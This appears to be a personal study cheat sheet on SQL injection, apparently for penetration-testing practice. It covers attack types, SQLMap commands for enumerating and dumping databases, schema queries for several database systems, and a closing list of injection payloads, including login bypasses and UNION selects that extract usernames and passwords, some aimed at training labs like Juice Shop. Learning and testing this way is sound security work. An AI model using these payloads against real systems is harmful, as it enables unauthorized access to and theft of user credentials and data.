# SQL Injection (SQLi)

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It can lead to unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.

## Types of SQL Injection

### In-band SQLi (Classic SQLi)

The attacker uses the same communication channel to launch the attack and gather results.
*   **Error-based SQLi:** The attacker crafts input that causes the database to produce error messages, revealing information about its structure.
*   **Union-based SQLi:** The attacker uses the `UNION` operator to combine the results of a legitimate query with a query of their own.

### Inferential SQLi (Blind SQLi)

The web application does not return the results of the malicious query directly. The attacker must infer the results by observing the application's behavior.
*   **Boolean-based SQLi:** The attacker sends a query that results in a true or false condition, which is reflected in the application's response (e.g., a different page is loaded).
*   **Time-based SQLi:** The attacker sends a query that instructs the database to wait for a specific amount of time. The response delay indicates whether the query was successful.

### Out-of-band SQLi

The attacker uses a different communication channel to exfiltrate data, such as making the server issue a DNS or HTTP request to a server the attacker controls.

## Common Payloads and Concepts

### Basic Injection
The most basic form of SQLi is to break out of a string literal and inject a condition that is always true.
*   `' or 1=1--`
*   `' or '1'='1`

### Union-based Injection
This is used to retrieve data from other tables.
*   `' UNION SELECT username, password FROM users--`

### Discovering Database Structure
In many database systems, you can query a data dictionary or information schema to get information about the database structure.
*   **Tables:** `' UNION SELECT table_name, null FROM information_schema.tables--`
*   **Columns:** `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--`

## SQLMap

SQLMap is an open-source tool that automates the process of detecting and exploiting SQL injection flaws. It is a powerful tool for penetration testers.

### Basic Usage
`sqlmap -u "http://vulnerable-website.com/product.php?id=1"`

### Common Options
*   `--dbs`: Enumerate databases.
*   `--tables -D <database>`: Enumerate tables in a database.
*   `--columns -T <table> -D <database>`: Enumerate columns in a table.
*   `--dump -C <columns> -T <table> -D <database>`: Dump data from a table.
*   `--batch`: Use default answers for all questions.
*   `--level=5 --risk=3`: Increase the number of checks performed.

Here’s the **complete list** for other major databases showing how to list table schemas (metadata about tables):

---

## **List table schema**

### 🐬 MySQL

```sql
SELECT *
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

---

### 🪶 SQLite

```sql
SELECT * FROM sqlite_master;
```

---

### 🐘 PostgreSQL

```sql
SELECT *
FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema', 'pg_catalog');
```

Or to list all tables in the current schema:

```sql
\dt
```

(in `psql` terminal)

---

### 🏛️ Oracle

```sql
SELECT *
FROM all_tables;
```

Or to list only tables owned by the current user:

```sql
SELECT *
FROM user_tables;
```

---

### 🦈 Microsoft SQL Server

```sql
SELECT *
FROM information_schema.tables
WHERE table_type = 'BASE TABLE';
```

Or with the database catalog view:

```sql
SELECT * FROM sys.tables;
```

---

### 🧩 MariaDB

*(Same as MySQL, since MariaDB is a fork)*

```sql
SELECT *
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

---

### 🐆 IBM DB2

```sql
SELECT *
FROM syscat.tables
WHERE tabschema NOT LIKE 'SYS%';
```

---


## Cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

URL encoding:
https://www.w3schools.com/tags/ref_urlencode.ASP



```sql
test' or 1=1--
```

```sql
1' and '1'='1'--
```

```sql
1' OR '1'='1'#
```

```sql
'UNION SELECT table_name, NULL FROM information_schema.tables #
```

```sql
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
```

```sql
'UNION SELECT user, password FROM users #
```

```sql
1 UNION SELECT user, password FROM users --
```

```sql
1%20+UNION+SELECT+user,password+FROM+users%23
```

```sql
'UNION SELECT user, password FROM users #
```

```sql
tester@localhost.com' --
```

```sql
admin' or 1=1 --
```

```sql
test'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--
```

```sql
test'))+UNION+SELECT+username,password,email,4,5,6,7,8,9+FROM+Users--
```

```sql
chris.pike@juice-sh.op' --
```
